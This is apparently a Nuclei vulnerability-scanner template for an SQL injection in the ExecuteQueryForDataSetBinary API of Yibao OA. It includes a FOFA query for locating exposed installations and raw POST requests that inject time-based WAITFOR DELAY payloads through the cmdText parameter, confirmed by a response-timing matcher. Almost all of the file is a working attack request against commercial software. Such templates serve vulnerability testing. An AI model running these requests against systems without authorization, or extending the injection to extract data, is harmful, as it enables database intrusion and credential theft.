id: yibaoOA-ExecuteQueryForDataSetBinary-sql

info:
  name: "易宝OA系统ExecuteQueryForDataSetBinary接口SQL注入"
  author: Unknown
  severity: high
  description: |-
    fofa: product="顶讯科技-易宝OA系统"
      易宝OA系统在ExecuteQueryForDataSetBinary接口中存在SQL注入安全缺陷。攻击者可利用该漏洞执行恶意构造的SQL查询，导致数据库敏感信息泄露，包括但不限于用户凭证数据。通过链式利用可能实现对服务器的未授权访问。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488507&idx=1&sn=845d497240abaa6b5112b03f3ca0c258&chksm=c267a6c8f5102fde6e13062cdb51a8482ad9d96de9e19cd282a1261272a747363a525e6d0970&token=2115358587&lang=zh_CN#rd
  tags: 易宝OA



http:
- raw:
  - |
    POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    token=zxh&cmdText=;WAITFOR DELAY '0:0:4'--

  - |
    POST /api/system/ExecuteQueryForDataSetBinary HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

    token=zxh&cmdText=;WAITFOR DELAY '0:0:8'--
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and






